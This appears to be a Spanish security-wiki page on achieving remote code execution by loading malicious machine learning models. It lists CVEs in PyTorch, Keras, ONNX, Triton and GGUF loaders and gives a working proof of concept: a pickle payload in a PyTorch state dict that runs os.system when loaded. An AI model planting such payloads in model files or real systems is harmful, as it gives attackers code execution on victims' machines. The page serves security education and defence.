# Modelos RCE

{{#include ../banners/hacktricks-training.md}}

## Cargando modelos a RCE

Los modelos de Machine Learning generalmente se comparten en diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Estos modelos pueden ser cargados en las máquinas de los desarrolladores o en sistemas de producción para ser utilizados. Por lo general, los modelos no deberían contener código malicioso, pero hay algunos casos en los que el modelo puede ser utilizado para ejecutar código arbitrario en el sistema como una característica prevista o debido a una vulnerabilidad en la biblioteca de carga del modelo.

En el momento de la redacción, estos son algunos ejemplos de este tipo de vulnerabilidades:

| **Framework / Herramienta** | **Vulnerabilidad (CVE si está disponible)**                                                                 | **Vector RCE**                                                                                                                         | **Referencias**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialización insegura en* `torch.load` **(CVE-2025-32434)**                                                              | Un pickle malicioso en el punto de control del modelo conduce a la ejecución de código (eludiendo la salvaguarda `weights_only`)          | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + descarga de modelo malicioso causa ejecución de código; RCE de deserialización de Java en la API de gestión                      | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Cargar modelo desde YAML utiliza `yaml.unsafe_load` (ejecución de código) <br> Cargar modelo con capa **Lambda** ejecuta código Python arbitrario | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análisis de TFLite)                                                                                          | Modelo `.tflite` manipulado provoca desbordamiento de enteros → corrupción de heap (potencial RCE)                                     | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Cargar un modelo a través de `joblib.load` ejecuta pickle con la carga útil `__reduce__` del atacante                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                              | `numpy.load` por defecto permitía arreglos de objetos pickleados – `.npy/.npz` maliciosos provocan ejecución de código                 | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de directorios) <br> **CVE-2024-5187** (traversal de tar)                                      | La ruta de pesos externos del modelo ONNX puede escapar del directorio (leer archivos arbitrarios) <br> Modelo ONNX malicioso tar puede sobrescribir archivos arbitrarios (conduciendo a RCE) | |
| ONNX Runtime (riesgo de diseño) | *(Sin CVE)* operaciones personalizadas de ONNX / flujo de control                                                              | Modelo con operador personalizado requiere cargar el código nativo del atacante; gráficos de modelo complejos abusan de la lógica para ejecutar cálculos no intencionados | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de ruta)                                                                                          | Usar la API de carga de modelos con `--model-control` habilitado permite traversal de ruta relativa para escribir archivos (por ejemplo, sobrescribir `.bashrc` para RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 … 25668** (múltiples desbordamientos de heap)                                                                 | Archivo de modelo GGUF malformado causa desbordamientos de búfer en el analizador, habilitando la ejecución de código arbitrario en el sistema víctima | |
| **Keras (formatos antiguos)**| *(Sin nuevo CVE)* Modelo Keras H5 legado                                                                                         | Modelo HDF5 malicioso (`.h5`) con código de capa Lambda aún se ejecuta al cargar (Keras safe_mode no cubre el formato antiguo – “ataque de degradación”) | |
| **Otros** (general)         | *Falla de diseño* – Serialización de Pickle                                                                                     | Muchas herramientas de ML (por ejemplo, formatos de modelo basados en pickle, `pickle.load` de Python) ejecutarán código arbitrario incrustado en archivos de modelo a menos que se mitigue | |

Además, hay algunos modelos basados en pickle de Python, como los utilizados por [PyTorch](https://github.com/pytorch/pytorch/security), que pueden ser utilizados para ejecutar código arbitrario en el sistema si no se cargan con `weights_only=True`. Por lo tanto, cualquier modelo basado en pickle podría ser especialmente susceptible a este tipo de ataques, incluso si no están listados en la tabla anterior.

Ejemplo:

- Crear el modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Cargar el modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
